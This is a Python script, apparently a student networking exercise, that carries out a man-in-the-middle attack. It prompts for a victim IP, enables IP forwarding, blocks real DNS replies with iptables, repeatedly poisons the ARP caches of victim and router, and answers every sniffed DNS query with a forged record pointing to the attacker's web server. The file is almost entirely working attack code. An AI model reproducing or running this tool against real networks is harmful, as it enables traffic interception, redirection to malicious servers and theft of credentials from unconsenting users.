
import socket
import sys
import threading
import fcntl
import signal
import time
import nmap
from scapy.all import *
import netifaces as nif


try:
    target_ip = raw_input("Enter Victim IP: ")
    router_ip = raw_input("Enter Router IP: ")
    spoof_ip = raw_input("Enter your webserver IP: ")
except KeyboardInterrupt:
    print "\n[*] User Requested Shutdown"
    print "[*] Exiting..."
    sys.exit(1)


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -D FORWARD -d " + target_ip + " -p UDP --sport 53 -j DROP")
os.system("iptables -A FORWARD -d " + target_ip + " -p UDP --sport 53 -j DROP")


def signal_handler(signal, frame):
    os.kill(os.getpid(), signal)

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    return s.getsockname()[0]


def iface_for_ip(ip):
    for iface in nif.interfaces():
        addrs = nif.ifaddresses(iface)
        try:
            iface_mac = str(addrs[nif.AF_LINK][0]['addr'])
            iface_ip = str(addrs[nif.AF_INET][0]['addr'])
        except KeyError:
            iface_mac = iface_ip = None

        if iface_ip == ip:
            return iface
    return None

def mac_for_ip(ip):
    interface = iface_for_ip(ip)
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return str(rcv.sprintf(r"%Ether.src%"))

my_ip = get_ip_address()
my_mac = mac_for_ip(my_ip)
target_mac = mac_for_ip(target_ip)
router_mac = mac_for_ip(router_ip)





def initialize():

    victim_packet = Ether(
        src=my_mac,        #sender's mac address
        dst=target_mac     #target's mac address
    )/ARP(
        hwsrc=my_mac,      #sender's mac address
        hwdst=target_mac,  #target's mac address
        psrc=router_ip,    #router's ip
        pdst=target_ip,    #target's ip
        op=2               #arp code 2 = reply
    )
    #victim_packet.show()

    router_packet = Ether(
        src=my_mac,        #sender's mac address
        dst=router_mac     #router's mac address
    )/ARP(
        hwsrc=my_mac,      #sender's mac address
        hwdst=router_mac,  #router's mac address
        psrc=target_ip,    #target's ip
        pdst=router_ip,    #router's ip
        op=2               #arp code 2 = reply
    )
    #router_packet.show()

    #filter_string = 'udp and port 53 and src ' + target_ip
    filter_string = 'udp and port 53'
    sniffThrd = threading.Thread(target=sniff_thread, args=(filter_string,))

    #Start arp spoof thread
    thrd = threading.Thread(target=arp_thread, args=(victim_packet, router_packet))

    sniffThrd.start()
    thrd.start()
    sniffThrd.join(1)
    thrd.join(1)


def arp_thread(victim_packet, router_packet):
    while 1:
        time.sleep(1.5)
        sendp(victim_packet, verbose=0)
        sendp(router_packet, verbose=0)


def sniff_thread(filter_string):
    # Start sniffing for DNS packets
    sniff(prn=process_dns, filter=filter_string, store=0)


def process_dns(pkt):
    #pkt.show()
    if ('DNS' in pkt and pkt['DNS'].opcode == 0L and pkt['DNS'].ancount == 0 and pkt['IP'].src != get_ip_address()):
        #print 'dns request'
        #if "milliways.bcit.ca" in pkt['DNS Question Record'].qname:
        pkt.show()
        spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
            / UDP(dport=pkt[UDP].sport, sport=53) \
            / DNS(id=pkt[DNS].id, qr=1, \
                  qd=DNSQR(qname=pkt[DNSQR].qname),\
                  an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoof_ip, ttl=3600))

        #spfResp.show()
        send(spfResp, verbose=0)
        return "Spoofed DNS Response Sent"


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    try:
        initialize()
    except KeyboardInterrupt:
        exit = True
        raise
